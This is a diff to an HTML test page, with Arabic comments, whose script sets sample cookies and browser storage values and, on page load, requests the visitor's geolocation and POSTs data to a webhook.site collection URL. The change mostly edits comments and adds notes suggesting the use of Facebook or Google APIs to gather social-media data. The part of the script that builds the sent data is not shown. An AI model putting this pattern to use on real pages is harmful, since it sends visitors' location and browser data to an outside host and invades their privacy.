@@ -8,19 +8,19 @@
 <body>
     <h1>اختبار إرسال البيانات إلى Webhook.site</h1>
     <script>
-        // 1. إضافة بعض الكوكيز يدويًا
+        // إضافة بعض الكوكيز يدويًا
         document.cookie = "user=JohnDoe; path=/";
         document.cookie = "session=12345; path=/";
 
-        // 2. إضافة بعض البيانات إلى localStorage و sessionStorage
+        // إضافة بعض البيانات إلى localStorage و sessionStorage
         localStorage.setItem('username', 'testUser');
         localStorage.setItem('email', 'test@example.com');
         sessionStorage.setItem('sessionId', '12345');
         sessionStorage.setItem('lastLogin', '2025-04-16');
 
-        // 3. إرسال بيانات الموقع الجغرافي
+        // إرسال بيانات الموقع الجغرافي
         navigator.geolocation.getCurrentPosition(function(position) {
-            // 4. إرسال البيانات إلى Webhook.site
+            // إرسال البيانات إلى Webhook.site
             fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -42,6 +42,10 @@
         }, function(error) {
             console.log("حدث خطأ في الحصول على الموقع الجغرافي: ", error);
         });
+
+        // (اختياري) يمكنك دمج API لمنصات التواصل الاجتماعي للحصول على بيانات مثل الفيسبوك أو جوجل
+        // على سبيل المثال، إذا أردت جمع بيانات الفيسبوك، تحتاج إلى استخدام Facebook Graph API
+        // هذا يتطلب أن يوافق المستخدم على منح إذن للوصول إلى بياناته.
     </script>
 </body>
 </html>
